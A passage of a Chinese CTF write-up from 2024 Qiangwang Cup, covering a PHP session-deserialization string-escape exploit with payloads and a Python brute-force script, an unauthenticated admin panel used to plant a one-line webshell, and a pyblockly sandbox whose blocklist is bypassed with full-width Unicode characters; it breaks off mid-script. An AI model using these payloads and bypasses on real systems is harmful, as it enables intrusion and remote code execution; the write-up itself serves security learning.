class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filterSensitiveFunctions</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$sessionFile</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getSessionFilePath</span>();<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$sessionFile</span>)) &#123;<br>            <span class="hljs-variable">$sessionData</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$sessionFile</span>);<br><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;sensitiveFunctions <span class="hljs-keyword">as</span> <span class="hljs-variable">$function</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$sessionData</span>, <span class="hljs-variable">$function</span>) !== <span class="hljs-literal">false</span>) &#123;<br>                    <span class="hljs-variable">$sessionData</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$function</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$sessionData</span>);<br>                &#125;<br>            &#125;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$sessionFile</span>, <span class="hljs-variable">$sessionData</span>);<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Sensitive functions have been filtered from the session file.&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Session file not found.&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//dashboard.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: login.php&#x27;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;<br>    &lt;title&gt;任何人都可以登录的平台&lt;/title&gt;<br>    &lt;style&gt;<br>        body &#123;<br>            background-color: <span class="hljs-comment">#f0f4f8;</span><br>            font-family: Arial, sans-serif;<br>            display: flex;<br>            flex-direction: column;<br>            align-items: center;<br>            justify-content: center;<br>            height: <span class="hljs-number">100</span>vh;<br>            margin: <span class="hljs-number">0</span>;<br>            text-align: center;<br>        &#125;<br>        h1 &#123;<br>            color: <span class="hljs-comment">#333;</span><br>            margin-bottom: <span class="hljs-number">20</span>px;<br>        &#125;<br>        p &#123;<br>            color: <span class="hljs-comment">#555;</span><br>            font-size: <span class="hljs-number">18</span>px;<br>            margin: <span class="hljs-number">0</span>;<br>        &#125;<br>        .session-info &#123;<br>            background-color: <span class="hljs-comment">#fff;</span><br>            border-radius: <span class="hljs-number">10</span>px;<br>            box-shadow: <span class="hljs-number">0</span> <span class="hljs-number">4</span>px <span class="hljs-number">10</span>px <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>);<br>            padding: <span class="hljs-number">20</span>px;<br>            width: <span class="hljs-number">300</span>px;<br>            margin-top: <span class="hljs-number">20</span>px;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;h1&gt;欢迎来到任何人都可以登录的平台&lt;/h1&gt;<br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">session</span>-<span class="hljs-title">info</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">p</span>&gt;你好，&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> <span class="hljs-title">htmlspecialchars</span>($<span class="hljs-title">_SESSION</span>[&#x27;<span class="hljs-title">user</span>&#x27;]); ?&gt;！&lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt;</span><br><span class="hljs-class"></span><br></code></pre></td></tr></table></figure><p>从上面三个php文件可以判断这道题很可能和session反序列化相关，但这里和常规的session反序列化稍有不同，这里没有使用不同的引擎进行序列化。</p><p>发现这里有个过滤函数会对session文件中的敏感字符进行替换，这很像php反序列化的字符串逃逸。</p><p>没错，这道题的解法就是二者的融合，在session的反序列化的时候用字符串进行逃逸，触发__destruct()函数，实现命令执行。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">user</span>|s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;litt1e-ice&quot;</span>;session_key|s:<span class="hljs-number">49</span>:<span class="hljs-string">&quot;62MJUzTLoyD8ZL7TMi89SjlIe8RSI9PKKYuCHMGb904mIWoVe&quot;</span>;password|s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;<br></code></pre></td></tr></table></figure><p>这是登录后对应session文件中保存的序列，其中session_key的长度是随机的，所以之后脚本要一直跑靠运气撞。</p><p>可以构想在user中加入一定长度的敏感字符，如system，在password里面写上希望反序列化的对象。</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs coq">user|<span class="hljs-type">s</span>:<span class="hljs-number">38</span>:<span class="hljs-string">&quot;systemsystemsystemsystemsystemsystemexecexec&quot;</span>;session_key|<span class="hljs-type">s</span>:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ui&quot;</span>;password|<span class="hljs-type">s</span>:<span class="hljs-number">73</span>:<span class="hljs-string">&quot;;password|O:15:&quot;</span>notouchitsclass<span class="hljs-string">&quot;:1:&#123;s:4:&quot;</span>data<span class="hljs-string">&quot;;s:16:&quot;</span>echo `/readflag`;<span class="hljs-string">&quot;;&#125;;&quot;</span>;<br>一共逃逸<span class="hljs-number">38</span>个字符，过滤后为：<br>user|<span class="hljs-type">s</span>:<span class="hljs-number">38</span>:<span class="hljs-string">&quot;&quot;</span>;session_key|<span class="hljs-type">s</span>:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ui&quot;</span>;password|<span class="hljs-type">s</span>:<span class="hljs-number">73</span>:<span class="hljs-string">&quot;;password|O:15:&quot;</span>notouchitsclass<span class="hljs-string">&quot;:1:&#123;s:4:&quot;</span>data<span class="hljs-string">&quot;;s:16:&quot;</span>echo `/readflag`;<span class="hljs-string">&quot;;&#125;;&quot;</span>;<br>这样password反序列化的时候就是notouchitsclass对象了<br></code></pre></td></tr></table></figure><p>脚步如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> os<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1&quot;</span><br><span class="hljs-comment">#url = &quot;http://eci-2zeg97hlr4shg75wqoyp.cloudeci1.ichunqiu.com:80&quot;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    data = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;exec&quot;</span>*<span class="hljs-number">9</span>+<span class="hljs-string">&quot;popen&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&#x27;;session_key|O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:28:&quot;syssystemtem(&quot;/readflag;ls -alh&quot;);&quot;;&#125;user|s:1:&quot;1aaaa&#x27;</span><br>    &#125;<br>    sess = os.urandom(<span class="hljs-number">8</span>).<span class="hljs-built_in">hex</span>()<br>    r = requests.post(url + <span class="hljs-string">&quot;/index.php&quot;</span>, data=data, headers=&#123;   <span class="hljs-comment">#本地测试后发现第一次请求index.php会生成session文件</span><br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">f&quot;PHPSESSID=<span class="hljs-subst">&#123;sess&#125;</span>&quot;</span>&#125;, allow_redirects=<span class="hljs-literal">False</span>)   <span class="hljs-comment">#第二次请求index.php才会过滤，但我本地测试的时候直接变成空的了，不知道怎么回事</span><br>    r = requests.post(url + <span class="hljs-string">&quot;/index.php&quot;</span>, data=data, headers=&#123; <span class="hljs-comment">#第三次请求dashboard.php才会有反序列化的回显</span><br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">f&quot;PHPSESSID=<span class="hljs-subst">&#123;sess&#125;</span>&quot;</span>&#125;, allow_redirects=<span class="hljs-literal">False</span>)<br><br>    r = requests.post(url + <span class="hljs-string">&quot;/dashboard.php&quot;</span>, data=data, headers=&#123;<br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">f&quot;PHPSESSID=<span class="hljs-subst">&#123;sess&#125;</span>&quot;</span>&#125;, allow_redirects=<span class="hljs-literal">False</span>)<br><br>    text = r.text<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;total &#x27;</span> <span class="hljs-keyword">in</span> text:<br>        <span class="hljs-built_in">print</span>(text)<br>        <span class="hljs-built_in">print</span>(sess)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>本地测试后发现第一次请求index.php会生成session文件，第二次请求index.php才会过滤，但我本地测试的时候直接变成空的了，不知道怎么回事，第三次请求dashboard.php才会有反序列化的回显，因为session反序列化是在session_start()的时候进行的;include(“class.php”);得放在session_start()的前面才行，不然反序列化的时候都不知道这个定义的类是什么样的。</p><h2 id="xiaohuanxiong"><a href="#xiaohuanxiong" class="headerlink" title="xiaohuanxiong"></a>xiaohuanxiong</h2><p>扫描目录发现后台未授权：<a href="http://47.94.195.201:22547/admin/admins/">http://47.94.195.201:22547/admin/admins/</a></p><p>这有点铸币了</p><p>支付设置里面直接使用php代码，直接修改成一句话木马</p><p><img src="/2024/11/04/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0wp/640.webp" alt="图片"></p><p><img src="/2024/11/04/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0wp/640-1730774028307-1.webp" alt="图片"></p><p><img src="/2024/11/04/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0wp/640-1730774028307-2.webp" alt="图片"></p><p>成功执行，使用蚁剑连接，拿到flag</p><p><img src="/2024/11/04/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0wp/640-1730774028308-3.webp" alt="图片"></p><h2 id="pyblockly"><a href="#pyblockly" class="headerlink" title="pyblockly"></a>pyblockly</h2><p>打开后的界面如下</p><p><img src="/2024/11/04/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0wp/image-20241105162252800.png" alt="image-20241105162252800"></p><p>源码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> unidecode<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> ast<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> importlib.util<br><span class="hljs-keyword">import</span> json<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;JSON_AS_ASCII&#x27;</span>] = <span class="hljs-literal">False</span><br><br>blacklist_pattern = <span class="hljs-string">r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">module_exists</span>(<span class="hljs-params">module_name</span>):<br><br>    spec = importlib.util.find_spec(module_name)<br>    <span class="hljs-keyword">if</span> spec <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> module_name <span class="hljs-keyword">in</span> sys.builtin_module_names:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <br>    <span class="hljs-keyword">if</span> spec.origin:<br>        std_lib_path = os.path.dirname(os.__file__)<br>        <br>        <span class="hljs-keyword">if</span> spec.origin.startswith(std_lib_path) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> spec.origin.startswith(os.getcwd()):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_secure</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> ast.walk(m):<br>        <span class="hljs-keyword">match</span> <span class="hljs-built_in">type</span>(node):<br>            <span class="hljs-keyword">case</span> ast.Import:  <br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ERROR: Banned module &quot;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">case</span> ast.ImportFrom: <br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ERROR: Banned module <span class="hljs-subst">&#123;node.module&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_for_blacklisted_symbols</span>(<span class="hljs-params">input_text</span>):<br>    <span class="hljs-keyword">if</span> re.search(blacklist_pattern, input_text):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">block_to_python</span>(<span class="hljs-params">block</span>):<br>    block_type = block[<span class="hljs-string">&#x27;type&#x27;</span>]<br>    code = <span class="hljs-string">&#x27;&#x27;</span><br>    <br>    <span class="hljs-keyword">if</span> block_type == <span class="hljs-string">&#x27;print&#x27;</span>:<br>        text_block = block[<span class="hljs-string">&#x27;inputs&#x27;</span>][<span class="hljs-string">&#x27;TEXT&#x27;</span>][<span class="hljs-string">&#x27;block&#x27;</span>]<br>        text = block_to_python(text_block)  <br>        code = <span class="hljs-string">f&quot;print(<span class="hljs-subst">&#123;text&#125;</span>)&quot;</span><br>           <br>    <span class="hljs-keyword">elif</span> block_type == <span class="hljs-string">&#x27;math_number&#x27;</span>:<br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(block[<span class="hljs-string">&#x27;fields&#x27;</span>][<span class="hljs-string">&#x27;NUM&#x27;</span>]).isdigit():      <br>            code =  <span class="hljs-built_in">int</span>(block[<span class="hljs-string">&#x27;fields&#x27;</span>][<span class="hljs-string">&#x27;NUM&#x27;</span>]) <br>        <span class="hljs-keyword">else</span>:<br>            code = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">elif</span> block_type == <span class="hljs-string">&#x27;text&#x27;</span>:<br>        <span class="hljs-keyword">if</span> check_for_blacklisted_symbols(block[<span class="hljs-string">&#x27;fields&#x27;</span>][<span class="hljs-string">&#x27;TEXT&#x27;</span>]):<br>            code = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>        <br>            code =  <span class="hljs-string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="hljs-string">&#x27;fields&#x27;</span>][<span class="hljs-string">&#x27;TEXT&#x27;</span>]) + <span class="hljs-string">&quot;&#x27;&quot;</span><br>    <span class="hljs-keyword">elif</span> block_type == <span class="hljs-string">&#x27;max&#x27;</span>:<br>        <br>        a_block = block[<span class="hljs-string">&#x27;inputs&#x27;</span>][<span class="hljs-string">&#x27;A&#x27;</span>][<span class="hljs-string">&#x27;block&#x27;</span>]<br>        b_block = block[<span class="hljs-string">&#x27;inputs&#x27;</span>][<span class="hljs-string">&#x27;B&#x27;</span>][<span class="hljs-string">&#x27;block&#x27;</span>]<br>        a = block_to_python(a_block)  <br>        b = block_to_python(b_block)<br>        code =  <span class="hljs-string">f&quot;max(<span class="hljs-subst">&#123;a&#125;</span>, <span class="hljs-subst">&#123;b&#125;</span>)&quot;</span><br><br>    <span class="hljs-keyword">elif</span> block_type == <span class="hljs-string">&#x27;min&#x27;</span>:<br>        a_block = block[<span class="hljs-string">&#x27;inputs&#x27;</span>][<span class="hljs-string">&#x27;A&#x27;</span>][<span class="hljs-string">&#x27;block&#x27;</span>]<br>        b_block = block[<span class="hljs-string">&#x27;inputs&#x27;</span>][<span class="hljs-string">&#x27;B&#x27;</span>][<span class="hljs-string">&#x27;block&#x27;</span>]<br>        a = block_to_python(a_block)<br>        b = block_to_python(b_block)<br>        code =  <span class="hljs-string">f&quot;min(<span class="hljs-subst">&#123;a&#125;</span>, <span class="hljs-subst">&#123;b&#125;</span>)&quot;</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;next&#x27;</span> <span class="hljs-keyword">in</span> block:<br>        <br>        block = block[<span class="hljs-string">&#x27;next&#x27;</span>][<span class="hljs-string">&#x27;block&#x27;</span>]<br>        <br>        code +=<span class="hljs-string">&quot;\n&quot;</span> + block_to_python(block)+ <span class="hljs-string">&quot;\n&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> code <br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">json_to_python</span>(<span class="hljs-params">blockly_data</span>):<br>    block = blockly_data[<span class="hljs-string">&#x27;blocks&#x27;</span>][<span class="hljs-string">&#x27;blocks&#x27;</span>][<span class="hljs-number">0</span>]<br><br>    python_code = <span class="hljs-string">&quot;&quot;</span><br>    python_code += block_to_python(block) + <span class="hljs-string">&quot;\n&quot;</span><br><br>        <br>    <span class="hljs-keyword">return</span> python_code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do</span>(<span class="hljs-params">source_code</span>):<br>    hook_code = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">def my_audit_hook(event_name, arg):</span><br><span class="hljs-string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span><br><span class="hljs-string">    if len(event_name) &gt; 4:</span><br><span class="hljs-string">        raise RuntimeError(&quot;Too Long!&quot;)</span><br><span class="hljs-string">    for bad in blacklist:</span><br><span class="hljs-string">        if bad in event_name:</span><br><span class="hljs-string">            raise RuntimeError(&quot;No!&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    <span class="hljs-built_in">print</span>(source_code)<br>    code = hook_code + source_code<br>    tree = <span class="hljs-built_in">compile</span>(source_code, <span class="hljs-string">&quot;run.py&quot;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> verify_secure(tree):  <br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;run.py&quot;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(code)        <br>            result = subprocess.run([<span class="hljs-string">&#x27;python&#x27;</span>, <span class="hljs-string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="hljs-number">5</span>).stdout.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>            os.remove(<span class="hljs-string">&#x27;run.py&#x27;</span>)<br>            <span class="hljs-keyword">return</span> result<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Execution aborted due to security concerns.&quot;</span><br>    <span class="hljs-keyword">except</span>:<br>        os.remove(<span class="hljs-string">&#x27;run.py&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Timeout!&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> app.send_static_file(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/blockly_json&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">blockly_json</span>():<br>    blockly_data = request.get_data()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(blockly_data))<br>    blockly_data = json.loads(blockly_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(blockly_data)<br>    <span class="hljs-keyword">try</span>:<br>        python_code = json_to_python(blockly_data)<br>        <span class="hljs-keyword">return</span> do(python_code)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Error generating Python code&quot;</span>, <span class="hljs-string">&quot;details&quot;</span>: <span class="hljs-built_in">str</span>(e)&#125;)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>阅读发现只有text的内容可以由用户控制，那只能从入手。</p><p>关注到unidecode.unidecode()这个函数，它可以将unicode字符转换成asclli字符，那我们可以使用全角的unicode字符绕过黑名单，然后由unidecode.unidecode()转换成半角的ascll码正常识别。</p><p>这里附上一个寻找半角对应的全角的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> unidecode<br><span class="hljs-built_in">print</span>(unidecode.unidecode(<span class="hljs-string">&quot;Κνωσός&quot;</span>))<br><br>target = <span class="hljs-string">&quot;(&quot;</span><br><br><span class="hljs-keyword">for</span> section <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x000</span>, <span class="hljs-number">0x1f1</span>):<br>    <span class="hljs-keyword">try</span>:<br>        mod = <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;unidecode.x%03x&#x27;</span>%(section), <span class="hljs-built_in">globals</span>(), <span class="hljs-built_in">locals</span>(), [<span class="hljs-string">&#x27;data&#x27;</span>])<br>        <span class="hljs-keyword">if</span> target <span class="hljs-keyword">in</span> mod.data:<br>            <span class="hljs-built_in">print</span>(mod.data)<br>            <span class="hljs-built_in">print</span>(section)<br>            <span class="hljs-built_in">print</span>(mod.data.index(target))<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((section &lt;&lt; <span class="hljs-number">8</span>) + 